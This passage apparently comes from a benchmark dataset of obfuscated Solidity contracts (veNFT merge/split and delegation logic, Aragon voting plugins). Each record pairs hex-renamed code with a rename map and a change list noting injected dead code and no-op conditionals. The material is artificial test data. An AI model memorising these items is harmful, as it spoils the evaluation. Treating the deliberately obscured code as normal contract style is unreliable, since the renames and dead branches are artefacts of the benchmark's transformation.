}\n\n    /// @notice Calculate total voting power\n    /// @dev Adheres to the ERC20 `totalSupply` interface for Aragon compatibility\n    /// @return Total voting power\n    function _0xdecc07(uint t) public view returns (uint) {\n        return VotingBalanceLogic._0xdecc07(t, _0x515bb7, _0x58a767,  _0x38ef44);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                            GAUGE VOTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(uint => uint) public _0x45015f;\n    mapping(uint => bool) public _0x91e191;\n\n    function _0x234a6e(address _0x06a452) external {\n        require(msg.sender == _0x0b0202);\n        _0x3dd917 = _0x06a452;\n    }\n\n    function _0xd291c4(uint _0x5df481) external {\n        require(msg.sender == _0x3dd917);\n        _0x91e191[_0x5df481] = true;\n    }\n\n    function _0xe19b1b(uint _0x5df481) external {\n        require(msg.sender == _0x3dd917, \"NA\");\n        _0x91e191[_0x5df481] = false;\n    }\n\n    function _0x98325b(uint _0x5df481) external {\n        require(msg.sender == _0x3dd917, \"NA\");\n        _0x45015f[_0x5df481] = _0x45015f[_0x5df481] + 1;\n    }\n\n    function _0xeeff1c(uint _0x5df481) external {\n        require(msg.sender == _0x3dd917, \"NA\");\n        _0x45015f[_0x5df481] = _0x45015f[_0x5df481] - 1;\n    }\n\n    function _0xdbfc0d(uint _0x926a34, uint _0x5d1a15) external _0x42237d _0x36539f(_0x926a34) {\n        require(_0x45015f[_0x926a34] == 0 && !_0x91e191[_0x926a34], \"ATT\");\n        require(_0x926a34 != _0x5d1a15, \"SAME\");\n        require(_0x090c25(msg.sender, _0x926a34) &&\n        _0x090c25(msg.sender, _0x5d1a15), \"NAO\");\n\n        IVotingEscrow.LockedBalance memory _0x113539 = _0xabcf2a[_0x926a34];\n        IVotingEscrow.LockedBalance memory _0x7e418b = _0xabcf2a[_0x5d1a15];\n        require(_0x7e418b._0xcab435 > block.timestamp ||  _0x7e418b._0x060c30,\"EXP||PERM\");\n        require(_0x113539._0x060c30 ? _0x7e418b._0x060c30 : true, \"!MERGE\");\n\n        uint _0x01c8f6 = uint(int256(_0x113539._0x4284c8));\n        uint _0xcab435 = _0x113539._0xcab435 >= _0x7e418b._0xcab435 ? _0x113539._0xcab435 : _0x7e418b._0xcab435;\n\n        _0xabcf2a[_0x926a34] = IVotingEscrow.LockedBalance(0, 0, false);\n        _0x6b3775(_0x926a34, _0x113539, IVotingEscrow.LockedBalance(0, 0, false));\n        _0x422597(_0x926a34);\n\n        IVotingEscrow.LockedBalance memory _0x401316;\n        _0x401316._0x060c30 = _0x7e418b._0x060c30;\n\n        if (_0x401316._0x060c30){\n            _0x401316._0x4284c8 = _0x7e418b._0x4284c8 + _0x113539._0x4284c8;\n            if (!_0x113539._0x060c30) {  // Only add if source wasn't already permanent\n                _0x01bc68 += _0x01c8f6;\n            }\n        }else{\n            _0x401316._0x4284c8 = _0x7e418b._0x4284c8 + _0x113539._0x4284c8;\n            _0x401316._0xcab435 = _0xcab435;\n        }\n\n        //_checkpointDelegatee(_delegates[_to], value0, true);\n        _0x6b3775(_0x5d1a15, _0x7e418b, _0x401316);\n        _0xabcf2a[_0x5d1a15] = _0x401316;\n\n        if(_0x91e191[_0x5d1a15]) {\n            IVoter(_0x3dd917)._0x4571e0(_0x5d1a15);\n        }\n        emit Merge(\n            msg.sender,\n            _0x926a34,\n            _0x5d1a15,\n            uint(int256(_0x113539._0x4284c8)),\n            uint(int256(_0x7e418b._0x4284c8)),\n            uint(int256(_0x401316._0x4284c8)),\n            _0x401316._0xcab435,\n            block.timestamp\n        );\n        emit MetadataUpdate(_0x5d1a15);\n    }\n\n    // function split(\n    //     uint _from,\n    //     uint _amount\n    // ) external nonreentrant splitAllowed(_from) notPartnerNFT(_from) returns (uint256 _tokenId1, uint256 _tokenId2) {\n    //     address owner = idToOwner[_from];\n\n    //     IVotingEscrow.LockedBalance memory newLocked = locked[_from];\n    //     require(newLocked.end > block.timestamp || newLocked.isPermanent, \"EXP\");\n\n    //     int128 _splitAmount = int128(int256(_amount));\n\n    //     require(_splitAmount != 0, \"ZV\");\n    //     require(newLocked.amount > _splitAmount, \"BIGVAL\");\n\n    //     locked[_from] = IVotingEscrow.LockedBalance(0, 0, false);\n    //     _checkpoint(_from, newLocked, IVotingEscrow.LockedBalance(0, 0, false));\n    //     _burn(_from);\n\n    //     newLocked.amount -= _splitAmount;\n    //     _tokenId1 = _createSplitNFT(owner, newLocked);\n\n    //     newLocked.amount = _splitAmount;\n    //     _tokenId2 = _createSplitNFT(owner, newLocked);\n\n    //     // emit Split(\n    //     //     _from,\n    //     //     _tokenId1,\n    //     //     _tokenId2,\n    //     //     msg.sender,\n    //     //     uint(int256(locked[_tokenId1].amount)),\n    //     //     uint(int256(_splitAmount)),\n    //     //     newLocked.end,\n    //     //     block.timestamp\n    //     // );\n    // }\n\n    /// @notice Split a veNFT into multiple new veNFTs with specified weight distribution\n    /// @param _from The token ID to split\n    /// @param amounts Array of weights for distributing the locked amount\n    /// @return newTokenIds Array of newly created token IDs\n    function _0x27c9ff(\n        uint _0x926a34,\n        uint[] memory _0x7b8f3b\n    ) external _0x42237d _0x94aa52(_0x926a34) _0x36539f(_0x926a34) returns (uint256[] memory _0x5694ff) {\n        require(_0x7b8f3b.length >= 2 && _0x7b8f3b.length <= 10, \"MIN2MAX10\");\n\n        address _0xdc2230 = _0xa3b03d[_0x926a34];\n\n        IVotingEscrow.LockedBalance memory _0xab4047 = _0xabcf2a[_0x926a34];\n        require(_0xab4047._0xcab435 > block.timestamp || _0xab4047._0x060c30, \"EXP\");\n        require(_0xab4047._0x4284c8 > 0, \"ZV\");\n\n        // Calculate total weight\n        uint _0x86c5ee = 0;\n        for(uint i = 0; i < _0x7b8f3b.length; i++) {\n            require(_0x7b8f3b[i] > 0, \"ZW\"); // Zero weight not allowed\n            _0x86c5ee += _0x7b8f3b[i];\n        }\n\n        // Burn the original NFT\n        _0xabcf2a[_0x926a34] = IVotingEscrow.LockedBalance(0, 0, false);\n        _0x6b3775(_0x926a34, _0xab4047, IVotingEscrow.LockedBalance(0, 0, false));\n        _0x422597(_0x926a34);\n\n        // Create new NFTs with proportional amounts\n        _0x5694ff = new uint256[](_0x7b8f3b.length);\n        uint[] memory _0x6f8df3 = new uint[](_0x7b8f3b.length);\n\n        for(uint i = 0; i < _0x7b8f3b.length; i++) {\n            IVotingEscrow.LockedBalance memory _0x5b4a13 = IVotingEscrow.LockedBalance({\n                _0x4284c8: int128(int256(uint256(int256(_0xab4047._0x4284c8)) * _0x7b8f3b[i] / _0x86c5ee)),\n                _0xcab435: _0xab4047._0xcab435,\n                _0x060c30: _0xab4047._0x060c30\n            });\n\n            _0x5694ff[i] = _0x6623a2(_0xdc2230, _0x5b4a13);\n            _0x6f8df3[i] = uint256(int256(_0x5b4a13._0x4284c8));\n        }\n\n        emit MultiSplit(\n            _0x926a34,\n            _0x5694ff,\n            msg.sender,\n            _0x6f8df3,\n            _0xab4047._0xcab435,\n            block.timestamp\n        );\n    }\n\n    function _0x6623a2(address _0x5d1a15, IVotingEscrow.LockedBalance memory _0xff506b) private returns (uint256 _0x5df481) {\n        if (1 == 1) { _0x5df481 = ++_0xa09499; }\n        _0xabcf2a[_0x5df481] = _0xff506b;\n        _0x6b3775(_0x5df481, IVotingEscrow.LockedBalance(0, 0, false), _0xff506b);\n        _0x9e0227(_0x5d1a15, _0x5df481);\n    }\n\n    function _0xc30a43(address _0x5f04b1, bool _0x807e33) external {\n        require(msg.sender == _0x0b0202);\n        _0x5adf69[_0x5f04b1] = _0x807e33;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                            DAO VOTING STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = _0xd45d86(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the delegation struct used by the contract\n    bytes32 public constant DELEGATION_TYPEHASH = _0xd45d86(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n\n    /// @notice A record of each accounts delegate\n    mapping(address => address) private _0xff69d2;\n\n    /// @notice A record of states for signing / validating signatures\n    mapping(address => uint) public _0xb81508;\n\n    /**\n     * @notice Overrides the standard `Comp.sol` delegates mapping to return\n     * the delegator's own address if they haven't delegated.\n     * This avoids having to delegate to oneself.\n     */\n    function _0x7f3cc6(address _0x7a3e7b) public view returns (address) {\n        address _0xb4a571 = _0xff69d2[_0x7a3e7b];\n        return _0xb4a571 == address(0) ? _0x7a3e7b : _0xb4a571;\n    }\n\n    /**\n     * @notice Gets the current votes balance for `account`\n     * @param account The address to get votes balance\n     * @return The number of current votes for `account`\n     */\n    function _0x367052(address _0xe2f196) external view returns (uint) {\n        uint32 _0x067d16 = _0x14872c._0x92559b[_0xe2f196];\n        if (_0x067d16 == 0) {\n            return 0;\n        }\n        uint[] storage _0x08e968 = _0x14872c._0xcdf694[_0xe2f196][_0x067d16 - 1]._0xac9a2a;\n        uint _0xe62107 = 0;\n        for (uint i = 0; i < _0x08e968.length; i++) {\n            uint _0x208667 = _0x08e968[i];\n            _0xe62107 = _0xe62107 + VotingBalanceLogic._0xf768b3(_0x208667, block.timestamp, _0x38ef44);\n        }\n        return _0xe62107;\n    }\n\n    function _0xc4c326(address _0xe2f196, uint timestamp)\n        public\n        view\n        returns (uint)\n    {\n        uint32 _0xb84ca5 = VotingDelegationLib._0x451039(_0x14872c, _0xe2f196, timestamp);\n        // Sum votes\n        uint[] storage _0x08e968 = _0x14872c._0xcdf694[_0xe2f196][_0xb84ca5]._0xac9a2a;\n        uint _0xe62107 = 0;\n        for (uint i = 0; i < _0x08e968.length; i++) {\n            uint _0x208667 = _0x08e968[i];\n            // Use the provided input timestamp here to get the right decay\n            _0xe62107 = _0xe62107 + VotingBalanceLogic._0xf768b3(_0x208667, timestamp,  _0x38ef44);\n        }\n\n        return _0xe62107;\n    }\n\n    function _0x16158b(uint256 timestamp) external view returns (uint) {\n        return _0xdecc07(timestamp);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                             DAO VOTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function _0x861f3e(address _0x7a3e7b, address _0xf922a7) internal {\n        /// @notice differs from `_delegate()` in `Comp.sol` to use `delegates` override method to simulate auto-delegation\n        address _0x7f3307 = _0x7f3cc6(_0x7a3e7b);\n\n        _0xff69d2[_0x7a3e7b] = _0xf922a7;\n\n        emit DelegateChanged(_0x7a3e7b, _0x7f3307, _0xf922a7);\n        VotingDelegationLib.TokenHelpers memory _0x992379 = VotingDelegationLib.TokenHelpers({\n            _0x366c46: _0x686137,\n            _0xe9033f: _0xe9033f,\n            _0x3a052a:_0x3a052a\n        });\n        VotingDelegationLib._0xc8c8d7(_0x14872c, _0x7a3e7b, _0x7f3307, _0xf922a7, _0x992379);\n    }\n\n    /**\n     * @notice Delegate votes from `msg.sender` to `delegatee`\n     * @param delegatee The address to delegate votes to\n     */\n    function _0xaefa69(address _0xf922a7) public {\n        if (_0xf922a7 == address(0)) _0xf922a7 = msg.sender;\n        return _0x861f3e(msg.sender, _0xf922a7);\n    }\n\n    function _0xe6cd70(\n        address _0xf922a7,\n        uint _0xd6f164,\n        uint _0xf89259,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        require(_0xf922a7 != msg.sender, \"NA\");\n        require(_0xf922a7 != address(0), \"ZA\");\n\n        bytes32 _0xb67841 = _0xd45d86(\n            abi._0x6bccba(\n                DOMAIN_TYPEHASH,\n                _0xd45d86(bytes(_0x3776a6)),\n                _0xd45d86(bytes(_0xa28113)),\n                block.chainid,\n                address(this)\n            )\n        );\n        bytes32 _0x4f780a = _0xd45d86(\n            abi._0x6bccba(DELEGATION_TYPEHASH, _0xf922a7, _0xd6f164, _0xf89259)\n        );\n        bytes32 _0x21ed45 = _0xd45d86(\n            abi._0xc36516(\"\\x19\\x01\", _0xb67841, _0x4f780a)\n        );\n        address _0x9fe8b6 = _0x5160ed(_0x21ed45, v, r, s);\n        require(\n            _0x9fe8b6 != address(0),\n            \"ZA\"\n        );\n        require(\n            _0xd6f164 == _0xb81508[_0x9fe8b6]++,\n            \"!NONCE\"\n        );\n        require(\n            block.timestamp <= _0xf89259,\n            \"EXP\"\n        );\n        return _0x861f3e(_0x9fe8b6, _0xf922a7);\n    }\n\n}",
      "rename_map": {
        "_removeTokenFromOwnerList": "_0xe25b85",
        "spenderIsApprovedForAll": "_0x3ff80c",
        "votingBalanceLogicData": "_0x38ef44",
        "senderIsApprovedForAll": "_0xff2727",
        "ownerToNFTokenCountFn": "_0xe9033f",
        "permanentLockBalance": "_0x01bc68",
        "_addTokenToOwnerList": "_0x1af70a",
        "ownerToNFTokenIdList": "_0x97ca44",
        "increase_unlock_time": "_0x8b22da",
        "ownerToNFTokenCount": "_0xd0dc6b",
        "get_last_user_slope": "_0x395a47",
        "tokenOfOwnerByIndex": "_0x3a052a",
        "supportedInterfaces": "_0x8f36bc",
        "getPastTotalSupply": "_0x16158b",
        "initial_last_point": "_0x04fa5b",
        "moveTokenDelegates": "_0xbf2e9b",
        "user_point_history": "_0x9baa66",
        "_isApprovedOrOwner": "_0x090c25",
        "setApprovalForAll": "_0x7349f7",
        "getPastVotesIndex": "_0x451039",
        "isApprovedOrOwner": "_0x3c6e17",
        "_moveAllDelegates": "_0xc8c8d7",
        "supportsInterface": "_0x0aabbb",
        "tokenToOwnerIndex": "_0x0c0286",
        "spenderIsApproved": "_0x613e78",
        "ownerToOperators": "_0x8e8e9f",
        "safeTransferFrom": "_0x49347d",
        "ownership_change": "_0x5bc75c",
        "_removeTokenFrom": "_0xd1a6da",
        "isApprovedForAll": "_0x06b160",
        "user_point_epoch": "_0xa2603a",
        "onERC721Received": "_0xdc2c97",
        "create_lock_for": "_0x5232ae",
        "domainSeparator": "_0xb67841",
        "unlockPermanent": "_0xe5799f",
        "currentDelegate": "_0x7f3307",
        "setPartnerVeNFT": "_0x50b58e",
        "_createSplitNFT": "_0x6623a2",
        "increase_amount": "_0x458296",
        "last_checkpoint": "_0x703e77",
        "spenderIsOwner": "_0x9ef348",
        "originalLocked": "_0xab4047",
        "balanceOfAtNFT": "_0xc8355f",
        "isPartnerVeNFT": "_0x503743",
        "_clearApproval": "_0x089840",
        "numCheckpoints": "_0x92559b",
        "_lock_duration": "_0xf51f7f",
        "balanceOfNFTAt": "_0xf79973",
        "_entered_state": "_0x9a5900",
        "locked_balance": "_0x473217",
        "totalSupplyAtT": "_0xdecc07",
        "_splitAmount2": "_0xc3f76b",
        "supply_before": "_0x481d9f",
        "current_index": "_0x1a6e77",
        "notPartnerNFT": "_0x36539f",
        "current_count": "_0x81102c",
        "actualAmounts": "_0x6f8df3",
        "_splitAmount1": "_0xea3733",
        "senderIsOwner": "_0x44c6ee",
        "idToApprovals": "_0x1d4965",
        "point_history": "_0xef96cd",
        "slope_changes": "_0x58a767",
        "totalSupplyAt": "_0x5dae03",
        "delegateBySig": "_0xe6cd70",
        "lockPermanent": "_0xc5a163",
        "_transferFrom": "_0x649e9a",
        "transferFrom": "_0xf8cb4b",
        "encodePacked": "_0xc36516",
        "_create_lock": "_0x1714a4",
        "deposit_type": "_0xdf513e",
        "nCheckpoints": "_0x067d16",
        "tokenHelpers": "_0x992379",
        "getPastVotes": "_0xc4c326",
        "_fromTokenId": "_0x9090a0",
        "splitAllowed": "_0x94aa52",
        "_amountFinal": "_0x961e9b",
        "balanceOfNFT": "_0xf768b3",
        "_newTokenIds": "_0x5182ca",
        "_not_entered": "_0x27fc60",
        "nonreentrant": "_0x42237d",
        "_deposit_for": "_0xe72d05",
        "_interfaceID": "_0x883fba",
        "_amountFrom": "_0x74bdb0",
        "deposit_for": "_0x3324b6",
        "block_slope": "_0x1980c2",
        "_addTokenTo": "_0x581a7c",
        "attachments": "_0x45015f",
        "lastTokenId": "_0xe33a39",
        "unlock_time": "_0x76d858",
        "totalWeight": "_0x86c5ee",
        "newTokenIds": "_0x5694ff",
        "_tokenIndex": "_0x586271",
        "_checkpoint": "_0x6b3775",
        "getApproved": "_0x52daae",
        "setArtProxy": "_0xb34922",
        "totalSupply": "_0xcae313",
        "_isContract": "_0x74fefa",
        "checkpoints": "_0xcdf694",
        "create_lock": "_0x3f20d8",
        "toggleSplit": "_0xc30a43",
        "newLockedTo": "_0x401316",
        "_checkIndex": "_0xb84ca5",
        "isPermanent": "_0x060c30",
        "new_dslope": "_0xa8de77",
        "user_epoch": "_0x119df3",
        "old_dslope": "_0xeeb9d0",
        "checkpoint": "_0x857a46",
        "_delegates": "_0xff69d2",
        "structHash": "_0x4f780a",
        "last_point": "_0x3fd558",
        "token_addr": "_0x9da803",
        "old_locked": "_0x24eb43",
        "multiSplit": "_0x27c9ff",
        "_newLocked": "_0xff506b",
        "_toTokenId": "_0x8cdd89",
        "prevSupply": "_0x4801a9",
        "new_locked": "_0xc23948",
        "_isPartner": "_0x38c90d",
        "balanceOf": "_0x456354",
        "permanent": "_0x4b8496",
        "_tokenIds": "_0x08e968",
        "_amountTo": "_0xadabd1",
        "_locktime": "_0xe26c1b",
        "newLocked": "_0x5b4a13",
        "idToOwner": "_0xa3b03d",
        "delegates": "_0x7f3cc6",
        "_tokenId1": "_0xe73705",
        "_tokenURI": "_0x3b9531",
        "ownerOfFn": "_0x366c46",
        "signatory": "_0x9fe8b6",
        "art_proxy": "_0x49c699",
        "_delegate": "_0x861f3e",
        "_tokenId2": "_0x68d257",
        "_approved": "_0xd524e5",
        "delegatee": "_0xf922a7",
        "delegator": "_0x7a3e7b",
        "ecrecover": "_0x5160ed",
        "keccak256": "_0xd45d86",
        "_operator": "_0xd22674",
        "_locked0": "_0x113539",
        "artProxy": "_0xa7958a",
        "_locked1": "_0x7e418b",
        "tokenURI": "_0x9f2cc5",
        "setVoter": "_0x234a6e",
        "decimals": "_0x45282b",
        "_account": "_0x5f04b1",
        "_balance": "_0xa5ebb8",
        "locktime": "_0x732bba",
        "provider": "_0x378a1a",
        "_entered": "_0x3be27d",
        "_spender": "_0xfaa387",
        "delegate": "_0xaefa69",
        "canSplit": "_0x5adf69",
        "tokenIds": "_0xac9a2a",
        "withdraw": "_0xcc469b",
        "_tokenId": "_0x5df481",
        "_amounts": "_0x1fd7f7",
        "getVotes": "_0x367052",
        "response": "_0x9aa8fb",
        "iMAXTIME": "_0x915f19",
        "abstain": "_0xe19b1b",
        "tokenId": "_0xa09499",
        "current": "_0xb4a571",
        "approve": "_0xff84e0",
        "amounts": "_0x7b8f3b",
        "version": "_0xa28113",
        "ownerOf": "_0x686137",
        "d_slope": "_0x782741",
        "_amount": "_0x65a0f1",
        "_sender": "_0x172b63",
        "setTeam": "_0xa53d9d",
        "account": "_0xe2f196",
        "_locked": "_0x0a02a8",
        "attach": "_0x98325b",
        "uepoch": "_0xbe558d",
        "cpData": "_0x14872c",
        "value0": "_0x01c8f6",
        "encode": "_0x6bccba",
        "supply": "_0x743a0f",
        "locked": "_0xabcf2a",
        "_voter": "_0x06a452",
        "_proxy": "_0xe80253",
        "_owner": "_0xcbad60",
        "digest": "_0x21ed45",
        "expiry": "_0xf89259",
        "amount": "_0x4284c8",
        "_epoch": "_0x46457f",
        "_value": "_0xd769e9",
        "nonces": "_0xb81508",
        "reason": "_0x86e3e6",
        "detach": "_0xeeff1c",
        "symbol": "_0xa3208b",
        "_block": "_0xc88e3a",
        "voting": "_0xd291c4",
        "u_old": "_0x00e623",
        "_burn": "_0x422597",
        "voted": "_0x91e191",
        "_team": "_0x73f926",
        "epoch": "_0x515bb7",
        "_bool": "_0x807e33",
        "voter": "_0x3dd917",
        "slope": "_0x79c1ee",
        "nonce": "_0xd6f164",
        "token": "_0x0ca0d4",
        "merge": "_0xdbfc0d",
        "_mint": "_0x9e0227",
        "votes": "_0xe62107",
        "_data": "_0xfb97fd",
        "_from": "_0x926a34",
        "_hybr": "_0x25a9a4",
        "owner": "_0xdc2230",
        "u_new": "_0xa2a3e7",
        "size": "_0xabdfff",
        "_idx": "_0x7ed466",
        "team": "_0x0b0202",
        "bias": "_0x8aa000",
        "name": "_0x3776a6",
        "poke": "_0x4571e0",
        "_to": "_0x5d1a15",
        "max": "_0x6ed9e9",
        "_ts": "_0xadd04e",
        "t_i": "_0x211a79",
        "end": "_0xcab435",
        "blk": "_0x61d546",
        "tId": "_0x208667",
        "ts": "_0xcd5a26",
        "_t": "_0x57cc72"
      },
      "changes": [
        "Renamed 227 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_011",
      "transformed_id": "ss_l4_medium_sn_gs_011",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\n\npragma solidity ^0.8.8;\n\nimport {ILockToGovernBase} from \"../interfaces/ILockToGovernBase.sol\";\nimport {ILockManager} from \"../interfaces/ILockManager.sol\";\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/IPermissionCondition.sol\";\nimport {PermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/PermissionCondition.sol\";\n\n/// @title MinVotingPowerCondition\n/// @author Aragon X - 2024\n/// @notice Checks if an account's voting power or token balance meets the threshold defined on the given plugin.\n/// @custom:security-contact sirt@aragon.org\ncontract MinVotingPowerCondition is PermissionCondition {\n    /// @notice The address of the `ILockToGovernBase` plugin used to fetch the settings from.\n    ILockToGovernBase public immutable _0xd36d52;\n\n    /// @notice The address of the LockManager used by the plugin.\n    ILockManager public immutable _0x5b20f6;\n\n    /// @notice The `IERC20` token interface used to check token balance.\n    IERC20 public immutable _0xf14aae;\n\n    /// @notice Initializes the contract with the `ILockToGovernBase` plugin address and caches the associated token.\n    /// @param _plugin The address of the `ILockToGovernBase` plugin.\n    constructor(ILockToGovernBase _0xe737bf) {\n        _0xd36d52 = _0xe737bf;\n        _0xf14aae = _0xd36d52._0xf14aae();\n        if (gasleft() > 0) { _0x5b20f6 = _0xd36d52._0x5b20f6(); }\n    }\n\n    /// @inheritdoc IPermissionCondition\n    /// @dev The function checks both the voting power and token balance to ensure `_who` meets the minimum voting\n    ///      threshold defined in the `TokenVoting` plugin. Returns `false` if the minimum requirement is unmet.\n    function _0x6484e0(address _0x430097, address _0xc8c698, bytes32 _0xc34b79, bytes calldata _0x4c95c7)\n        public\n        view\n        override\n        returns (bool)\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        (_0x430097, _0x4c95c7, _0xc34b79);\n\n        uint256 _0x3aed8f = _0xf14aae._0x3a7e63(_0xc8c698) + _0x5b20f6._0x51c894(_0xc8c698);\n        uint256 _0xd64eac = _0xd36d52._0x9f9c69();\n\n        return _0x3aed8f >= _0xd64eac;\n    }\n}\n",
      "rename_map": {
        "_minProposerVotingPower": "_0xd64eac",
        "minProposerVotingPower": "_0x9f9c69",
        "getLockedBalance": "_0x51c894",
        "_currentBalance": "_0x3aed8f",
        "_permissionId": "_0xc34b79",
        "lockManager": "_0x5b20f6",
        "isGranted": "_0x6484e0",
        "balanceOf": "_0x3a7e63",
        "_plugin": "_0xe737bf",
        "plugin": "_0xd36d52",
        "_where": "_0x430097",
        "token": "_0xf14aae",
        "_data": "_0x4c95c7",
        "_who": "_0xc8c698"
      },
      "changes": [
        "Renamed 14 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_012",
      "transformed_id": "ss_l4_medium_sn_gs_012",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\npragma solidity ^0.8.13;\n\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockToGovernBase} from \"./base/LockToGovernBase.sol\";\nimport {ILockToVote} from \"./interfaces/ILockToVote.sol\";\nimport {IDAO} from \"@aragon/osx-commons-contracts/src/dao/IDAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IProposal} from \"@aragon/osx-commons-contracts/src/plugin/extensions/proposal/IProposal.sol\";\nimport {ERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {SafeCastUpgradeable} from \"@openzeppelin/contracts-upgradeable/utils/math/SafeCastUpgradeable.sol\";\nimport {MajorityVotingBase} from \"./base/MajorityVotingBase.sol\";\nimport {ILockToGovernBase} from \"./interfaces/ILockToGovernBase.sol\";\n\ncontract LockToVotePlugin is ILockToVote, MajorityVotingBase, LockToGovernBase {\n    using SafeCastUpgradeable for uint256;\n\n    /// @notice The [ERC-165](https://eips.ethereum.org/EIPS/eip-165) interface ID of the contract.\n    bytes4 internal constant LOCK_TO_VOTE_INTERFACE_ID =\n        this._0xf3da05.selector ^ this._0x2d9668.selector;\n\n    /// @notice The ID of the permission required to call the `createProposal` functions.\n    bytes32 public constant CREATE_PROPOSAL_PERMISSION_ID = _0x540c74(\"CREATE_PROPOSAL_PERMISSION\");\n\n    /// @notice The ID of the permission required to call `vote` and `clearVote`.\n    bytes32 public constant LOCK_MANAGER_PERMISSION_ID = _0x540c74(\"LOCK_MANAGER_PERMISSION\");\n\n    event VoteCleared(uint256 _0x8c2b0f, address _0x8ed3f4);\n\n    error VoteRemovalForbidden(uint256 _0x8c2b0f, address _0x8ed3f4);\n\n    /// @notice Initializes the component.\n    /// @dev This method is required to support [ERC-1822](https://eips.ethereum.org/EIPS/eip-1822).\n    /// @param _dao The IDAO interface of the associated DAO.\n    /// @param _votingSettings The voting settings.\n    /// @param _targetConfig Configuration for the execution target, specifying the target address and operation type\n    ///     (either `Call` or `DelegateCall`). Defined by `TargetConfig` in the `IPlugin` interface,\n    ///     part of the `osx-commons-contracts` package, added in build 3.\n    /// @param _pluginMetadata The plugin specific information encoded in bytes.\n    ///     This can also be an ipfs cid encoded in bytes.\n    function _0x4a4cec(\n        IDAO _0xc10fdc,\n        ILockManager _0xd240d6,\n        VotingSettings calldata _0xf2cea6,\n        IPlugin.TargetConfig calldata _0x0c9599,\n        bytes calldata _0xc6b7ef\n    ) external _0xc5a337 _0x1f05c7(1) {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        __MajorityVotingBase_init(_0xc10fdc, _0xf2cea6, _0x0c9599, _0xc6b7ef);\n        __LockToGovernBase_init(_0xd240d6);\n\n        emit MembershipContractAnnounced({_0xa7ab3b: address(_0xd240d6._0x96ec55())});\n    }\n\n    /// @notice Checks if this or the parent contract supports an interface by its ID.\n    /// @param _interfaceId The ID of the interface.\n    /// @return Returns `true` if the interface is supported.\n    function _0x8fd1ab(bytes4 _0x6f6449)\n        public\n        view\n        virtual\n        override(MajorityVotingBase, LockToGovernBase)\n        returns (bool)\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        return _0x6f6449 == LOCK_TO_VOTE_INTERFACE_ID || _0x6f6449 == type(ILockToVote)._0xd226f5\n            || super._0x8fd1ab(_0x6f6449);\n    }\n\n    /// @inheritdoc IProposal\n    function _0xf13b8b() external pure override returns (string memory) {\n        return \"(uint256 allowFailureMap)\";\n    }\n\n    /// @inheritdoc IProposal\n    /// @dev Requires the `CREATE_PROPOSAL_PERMISSION_ID` permission.\n    function _0x2d9668(\n        bytes calldata _0xd3f13c,\n        Action[] memory _0x9b032f,\n        uint64 _0xcf8488,\n        uint64 _0x8844df,\n        bytes memory _0x6d8c07\n    ) external _0x7c9a77(CREATE_PROPOSAL_PERMISSION_ID) returns (uint256 _0x8c2b0f) {\n        uint256 _0x2fd843;\n\n        if (_0x6d8c07.length != 0) {\n            (_0x2fd843) = abi._0x441ead(_0x6d8c07, (uint256));\n        }\n\n        if (_0xd436e2() == 0) {\n            revert NoVotingPower();\n        }\n\n        /// @dev `minProposerVotingPower` is checked at the the permission condition behind auth(CREATE_PROPOSAL_PERMISSION_ID)\n\n        (_0xcf8488, _0x8844df) = _0x261fe4(_0xcf8488, _0x8844df);\n\n        _0x8c2b0f = _0x0de2b5(_0x540c74(abi._0x11520e(_0x9b032f, _0xd3f13c)));\n\n        if (_0x7ee6bf(_0x8c2b0f)) {\n            revert ProposalAlreadyExists(_0x8c2b0f);\n        }\n\n        // Store proposal related information\n        Proposal storage _0x466f09 = _0xa8d22f[_0x8c2b0f];\n\n        _0x466f09._0x33af98._0xec22b1 = _0xec22b1();\n        _0x466f09._0x33af98._0xcb81a6 = _0xcb81a6();\n        _0x466f09._0x33af98._0x9f3511 = _0xcf8488;\n        _0x466f09._0x33af98._0xb1c0fd = _0x8844df;\n        _0x466f09._0x33af98._0x5680b0 = _0x5680b0();\n        _0x466f09._0x33af98._0x6762a0 = _0x6762a0();\n\n        _0x466f09._0xb61a10 = _0x964e1a();\n\n        // Reduce costs\n        if (_0x2fd843 != 0) {\n            _0x466f09._0x0f782c = _0x2fd843;\n        }\n\n        for (uint256 i; i < _0x9b032f.length;) {\n            _0x466f09._0x298e26.push(_0x9b032f[i]);\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit ProposalCreated(_0x8c2b0f, _0x34f20a(), _0xcf8488, _0x8844df, _0xd3f13c, _0x9b032f, _0x2fd843);\n\n        